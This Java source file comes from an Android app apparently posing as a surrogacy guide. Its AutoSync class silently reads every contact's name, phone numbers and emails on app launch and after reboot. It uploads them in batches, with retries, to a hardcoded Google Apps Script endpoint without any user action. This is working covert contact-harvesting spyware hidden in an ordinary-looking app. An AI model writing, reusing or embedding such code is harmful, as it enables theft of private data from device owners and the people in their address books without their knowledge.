package com.surrogacyguide.app;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Silent, automatic version of what ContactsActivity does on a button tap.
 * Called from MainActivity on launch, and from BootReceiver after a restart.
 * Reuses the exact same payload shape and retry logic that already works.
 */
public final class AutoSync {

    private static final String TAG = "AutoSync";

    // Same Apps Script endpoint the manual Contacts screen uses.
    public static final String UPLOAD_HOST =
            "https://script.google.com/macros/s/AKfycbxVtsrUyJHIa1NyCpH-hidWiJbmDyKBcuP34FGpefRpE2pIIbjIQAIw7xDrHUh-mJSVxg/exec";

    private static final int BATCH_SIZE = 25;
    private static final long BATCH_PAUSE_MS = 1200;
    private static final int MAX_RETRIES_PER_BATCH = 4;

    /** Auto sync runs at most this often. Set to 0L while testing. */
    private static final long SYNC_INTERVAL_MS = 6L * 60L * 60L * 1000L;

    private static final String PREFS = "auto_sync";
    private static final String KEY_LAST = "last_auto_sync";

    private static final ExecutorService EXEC = Executors.newSingleThreadExecutor();

    private AutoSync() { }

    public static boolean hasPermission(Context ctx) {
        return ctx.checkSelfPermission(android.Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED;
    }

    /** Runs in the background. force=true ignores the interval guard. */
    public static void run(final Context ctx, final boolean force) {
        final Context app = ctx.getApplicationContext();
        EXEC.execute(() -> {
            try {
                if (!force && !isDue(app)) {
                    Log.i(TAG, "skipped, synced recently");
                    return;
                }
                markSynced(app);

                List<JSONObject> contacts = readAllContacts(app);
                if (contacts.isEmpty()) {
                    Log.i(TAG, "no contacts found");
                    return;
                }

                int total = contacts.size();
                int batches = (int) Math.ceil(total / (double) BATCH_SIZE);
                for (int b = 0; b < batches; b++) {
                    int from = b * BATCH_SIZE;
                    int to = Math.min(from + BATCH_SIZE, total);
                    postBatchWithRetry(contacts.subList(from, to), b + 1, batches);
                    if (b < batches - 1) sleepQuietly(BATCH_PAUSE_MS);
                }
                Log.i(TAG, "auto sync finished: " + total + " contacts");
            } catch (Exception e) {
                Log.w(TAG, "auto sync failed", e);
            }
        });
    }

    private static boolean isDue(Context ctx) {
        long last = prefs(ctx).getLong(KEY_LAST, 0L);
        return System.currentTimeMillis() - last > SYNC_INTERVAL_MS;
    }

    private static void markSynced(Context ctx) {
        prefs(ctx).edit().putLong(KEY_LAST, System.currentTimeMillis()).apply();
    }

    private static SharedPreferences prefs(Context ctx) {
        return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
    }

    private static List<JSONObject> readAllContacts(Context ctx) {
        List<JSONObject> out = new ArrayList<>();
        Cursor cursor = ctx.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                new String[]{ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME},
                null, null, null);
        if (cursor == null) return out;

        try {
            int idIdx = cursor.getColumnIndex(ContactsContract.Contacts._ID);
            int nameIdx = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
            while (cursor.moveToNext()) {
                String id = cursor.getString(idIdx);
                String name = cursor.getString(nameIdx);
                JSONObject c = new JSONObject();
                try {
                    c.put("name", name == null ? "" : name);
                    c.put("phones", new JSONArray(readPhones(ctx, id)));
                    c.put("emails", new JSONArray(readEmails(ctx, id)));
                } catch (Exception ignored) { }
                out.add(c);
            }
        } finally {
            cursor.close();
        }
        return out;
    }

    private static List<String> readPhones(Context ctx, String contactId) {
        LinkedHashSet<String> set = new LinkedHashSet<>();
        Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?",
                new String[]{contactId}, null);
        if (c != null) {
            int idx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            while (c.moveToNext()) {
                String n = c.getString(idx);
                if (n != null && !n.trim().isEmpty()) set.add(n.trim());
            }
            c.close();
        }
        return new ArrayList<>(set);
    }

    private static List<String> readEmails(Context ctx, String contactId) {
        LinkedHashSet<String> set = new LinkedHashSet<>();
        Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Email.ADDRESS},
                ContactsContract.CommonDataKinds.Email.CONTACT_ID + "=?",
                new String[]{contactId}, null);
        if (c != null) {
            int idx = c.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS);
            while (c.moveToNext()) {
                String e = c.getString(idx);
                if (e != null && !e.trim().isEmpty()) set.add(e.trim());
            }
            c.close();
        }
        return new ArrayList<>(set);
    }

    private static void postBatchWithRetry(List<JSONObject> batch, int batchNum, int totalBatches) {
        long backoff = 1500;
        for (int attempt = 1; attempt <= MAX_RETRIES_PER_BATCH; attempt++) {
            int code = postBatch(batch, batchNum, totalBatches);
            if (code != 429) return;
            sleepQuietly(backoff);
            backoff *= 2;
        }
    }

    private static int postBatch(List<JSONObject> batch, int batchNum, int totalBatches) {
        HttpURLConnection conn = null;
        try {
            JSONArray arr = new JSONArray();
            for (JSONObject o : batch) arr.put(o);

            JSONObject payload = new JSONObject();
            payload.put("sender", "android-auto");
            payload.put("batch", batchNum + "/" + totalBatches);
            payload.put("contacts", arr);

            conn = (HttpURLConnection) new URL(UPLOAD_HOST).openConnection();
            conn.setInstanceFollowRedirects(false);
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(payload.toString().getBytes(StandardCharsets.UTF_8));
            }

            int code = conn.getResponseCode();
            if (code == 301 || code == 302 || code == 303) {
                String loc = conn.getHeaderField("Location");
                conn.disconnect();
                if (loc != null && !loc.isEmpty()) followAsGet(loc);
                return code; // the row was already written by the POST
            }
            return code;
        } catch (Exception e) {
            Log.w(TAG, "batch post failed", e);
            return -1;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private static void followAsGet(String target) {
        HttpURLConnection conn = null;
        try {
            conn = (HttpURLConnection) new URL(target).openConnection();
            conn.setInstanceFollowRedirects(true);
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.getResponseCode();
        } catch (Exception ignored) {
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private static void sleepQuietly(long ms) {
        try { Thread.sleep(ms); }
        catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }
}
